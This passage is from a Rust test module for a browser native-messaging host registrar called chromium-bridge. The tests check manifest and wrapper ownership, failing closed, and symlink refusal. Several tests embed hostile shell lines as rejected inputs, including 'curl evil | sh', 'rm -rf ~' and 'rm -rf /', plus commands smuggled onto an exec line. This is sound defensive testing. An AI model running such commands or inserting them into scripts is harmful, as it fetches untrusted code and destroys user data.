        assert!(line.contains("removed manifest"));
        assert!(!target.registration.manifest_path().exists());
        assert_eq!(assess(&target.registration), RegState::Missing);
        // Uninstall again: cleanly reports nothing to do.
        let line = Registrar::uninstall(&target).unwrap();
        assert!(line.contains("not registered"));

        let (removed, errors) = remove_wrappers(&tree.path("install"));
        assert_eq!(removed.len(), 1, "{removed:?}");
        assert!(errors.is_empty(), "{errors:?}");
        assert!(!tree.path("install/run-host-chrome.sh").exists());
        // The now-empty install dir is dropped too.
        assert!(!tree.path("install").exists());
    }

    #[test]
    fn assess_flags_a_dangling_launch_path_as_stale() {
        let tree = TempTree::new("stale");
        let reg = registrar(&tree);
        let target = browser_target(&tree);
        reg.register(&target).unwrap();
        // Simulate the binary/wrapper disappearing (moved binary, wiped dir).
        fs::remove_file(tree.path("install/run-host-chrome.sh")).unwrap();
        match assess(&target.registration) {
            RegState::Stale(why) => assert!(why.contains("launch path missing"), "{why}"),
            other => panic!("expected Stale, got {other:?}"),
        }
        // --fix's engine repairs it in place.
        reg.register(&target).unwrap();
        assert_eq!(assess(&target.registration), RegState::Ok);
    }

    #[test]
    fn explicit_dir_gets_the_unlabeled_wrapper() {
        let tree = TempTree::new("explicit");
        let reg = registrar(&tree);
        let target = Target::for_explicit_dir(&tree.path("custom"));
        reg.register(&target).unwrap();
        let manifest: serde_json::Value =
            serde_json::from_str(&fs::read_to_string(target.registration.manifest_path()).unwrap())
                .unwrap();
        assert_eq!(
            manifest["path"].as_str().unwrap(),
            tree.path("install/run-host.sh").to_string_lossy()
        );
        let script = fs::read_to_string(tree.path("install/run-host.sh")).unwrap();
        assert!(!script.contains("--label"));
    }

    #[test]
    fn foreign_manifest_is_never_overwritten_or_removed() {
        let tree = TempTree::new("foreign");
        let reg = registrar(&tree);
        let target = browser_target(&tree);
        let manifest_path = target.registration.manifest_path();
        fs::create_dir_all(manifest_path.parent().unwrap()).unwrap();
        let foreign =
            r#"{"name":"com.other.host","description":"someone else","path":"/x","type":"stdio"}"#;
        fs::write(&manifest_path, foreign).unwrap();

        let err = reg.register(&target).unwrap_err();
        assert!(err.contains("refusing to overwrite"), "{err}");
        let err = Registrar::uninstall(&target).unwrap_err();
        assert!(err.contains("refusing to remove"), "{err}");
        // Fail closed: the file is byte-identical afterwards.
        assert_eq!(fs::read_to_string(&manifest_path).unwrap(), foreign);
        assert!(matches!(assess(&target.registration), RegState::Foreign(_)));
    }

    #[test]
    fn unreadable_manifest_path_fails_closed() {
        // A DIRECTORY at the manifest path: read fails with a non-NotFound
        // error, and neither register nor uninstall may proceed.
        let tree = TempTree::new("unreadable");
        let reg = registrar(&tree);
        let target = browser_target(&tree);
        fs::create_dir_all(target.registration.manifest_path()).unwrap();

        let err = reg.register(&target).unwrap_err();
        assert!(err.contains("cannot verify"), "{err}");
        let err = Registrar::uninstall(&target).unwrap_err();
        assert!(err.contains("left in place"), "{err}");
        assert!(target.registration.manifest_path().is_dir());
        assert!(matches!(
            assess(&target.registration),
            RegState::Unreadable(_)
        ));
    }

    #[test]
    fn ownership_is_exact_description_match() {
        // install.sh wrote this exact description (no marker suffix).
        let legacy = format!(
            r#"{{"name":"{HOST_ID}","description":"Chromium Bridge native messaging host","path":"/x/run-host.sh","type":"stdio","allowed_origins":["chrome-extension://{PINNED_EXTENSION_ID}/"]}}"#
        );
        assert_eq!(manifest_ownership(&legacy), Ownership::Ours);
        // Same shape under another host id is foreign.
        assert!(matches!(
            manifest_ownership(&legacy.replace(HOST_ID, "com.other.host")),
            Ownership::Foreign(_)
        ));
        // A description that merely STARTS with our prefix is not ours.
        let prefixed = legacy.replace(
            "Chromium Bridge native messaging host",
            "Chromium Bridge native messaging host - unrelated fork",
        );
        assert!(matches!(
            manifest_ownership(&prefixed),
            Ownership::Foreign(_)
        ));
        assert!(matches!(
            manifest_ownership("not json"),
            Ownership::Foreign(_)
        ));
    }

    #[test]
    fn wrapper_ownership_requires_the_exec_trampoline_shape() {
        // Ours (current shape, with marker comment).
        assert!(wrapper_is_ours(
            "#!/usr/bin/env bash\n# managed by chromium-bridge; safe to delete\nexec '/x/chromium-bridge' --native-host --label 'chrome'\n"
        ));
        // Legacy install.sh shape (no comment).
        assert!(wrapper_is_ours(
            "#!/usr/bin/env bash\nexec /x/chromium-bridge --native-host\n"
        ));
        // A script that merely MENTIONS --native-host in a comment is not ours.
        assert!(!wrapper_is_ours(
            "#!/usr/bin/env bash\n# --native-host\nrm -rf ~/important\n"
        ));
        // Extra payload beyond the trampoline is not ours.
        assert!(!wrapper_is_ours(
            "#!/usr/bin/env bash\ncurl evil | sh\nexec /x/y --native-host\n"
        ));
        // Wrong shebang is not ours.
        assert!(!wrapper_is_ours("#!/bin/sh\nexec /x/y --native-host\n"));
        // Two exec lines are not ours.
        assert!(!wrapper_is_ours(
            "#!/usr/bin/env bash\nexec /a --native-host\nexec /b --native-host\n"
        ));
        // A compound command smuggled onto the exec line is not ours.
        assert!(!wrapper_is_ours(
            "#!/usr/bin/env bash\nexec /x --native-host; curl evil | sh\n"
        ));
        assert!(!wrapper_is_ours(
            "#!/usr/bin/env bash\nexec /x --native-host && rm -rf ~\n"
        ));
        assert!(!wrapper_is_ours(
            "#!/usr/bin/env bash\nexec $(pick-a-binary) --native-host\n"
        ));
        // Extra argv smuggled between path and flag is not a trampoline.
        assert!(!wrapper_is_ours(
            "#!/usr/bin/env bash\nexec /bin/sh -c 'touch /tmp/pwn' --native-host\n"
        ));
        // A malformed label is not ours either.
        assert!(!wrapper_is_ours(
            "#!/usr/bin/env bash\nexec /x --native-host --label 'bad label'\n"
        ));
        // Word expansion (brace, glob, tilde) unquoted is not shell-literal.
        assert!(!wrapper_is_ours(
            "#!/usr/bin/env bash\nexec /tmp/{a,b} --native-host\n"
        ));
        assert!(!wrapper_is_ours(
            "#!/usr/bin/env bash\nexec /tmp/pwn-* --native-host\n"
        ));
        assert!(!wrapper_is_ours(
            "#!/usr/bin/env bash\nexec ~/other-binary --native-host\n"
        ));
        // Quoted, those same characters are literal and fine.
        assert!(wrapper_is_ours(
            "#!/usr/bin/env bash\nexec '/tmp/odd {dir}/chromium-bridge' --native-host\n"
        ));
        // Legitimate paths with spaces pass, quoted or backslash-escaped.
        assert!(wrapper_is_ours(
            "#!/usr/bin/env bash\nexec '/Users/My Name/.chromium-bridge/chromium-bridge' --native-host --label 'chrome'\n"
        ));
        assert!(wrapper_is_ours(
            "#!/usr/bin/env bash\nexec /Users/My\\ Name/.chromium-bridge/chromium-bridge --native-host\n"
        ));
    }

    #[test]
    fn foreign_wrapper_names_are_left_in_place() {
        let tree = TempTree::new("wrapper");
        let dir = tree.path("install");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("run-host-chrome.sh"), "#!/bin/sh\nrm -rf /\n").unwrap();
        let (removed, errors) = remove_wrappers(&dir);
        assert!(removed.is_empty());
        assert_eq!(errors.len(), 1);
        assert!(dir.join("run-host-chrome.sh").exists());
    }

    #[test]
    fn shell_quote_defuses_single_quotes() {
        assert_eq!(shell_quote("plain"), "'plain'");
        assert_eq!(shell_quote("a'b"), r"'a'\''b'");
    }

    #[cfg(unix)]
    #[test]
    fn symlinked_install_dir_is_refused() {
        let tree = TempTree::new("symlink");
        let real = tree.path("elsewhere");
        fs::create_dir_all(&real).unwrap();
        let link = tree.path("install");
        std::os::unix::fs::symlink(&real, &link).unwrap();
        let reg = Registrar {
            host_exe: tree.path("bin/chromium-bridge"),
            install_dir: link,
            extension_id: PINNED_EXTENSION_ID.to_string(),
        };
        let target = browser_target(&tree);
        let err = reg.register(&target).unwrap_err();
        assert!(err.contains("symlink"), "{err}");
        // Nothing was written through the link.
        assert!(fs::read_dir(&real).unwrap().next().is_none());
    }

    #[test]
    fn registry_targets_fail_closed_off_windows() {
        #[cfg(not(windows))]
        {
            let tree = TempTree::new("registry");
            let reg = registrar(&tree);
            let target = Target {
                browser: Some(Browser::Chrome),
                registration: Registration::Registry {
                    key: r"Software\Google\Chrome\NativeMessagingHosts\x".into(),
                    manifest_path: tree.path("store/x.json"),
                },
            };
            // Refused before anything is written: no manifest, no store dir.
            assert!(reg.register(&target).is_err());
            assert!(!target.registration.manifest_path().exists());
            assert!(!tree.path("store").exists());
            assert!(Registrar::uninstall(&target).is_err());
        }
    }
}
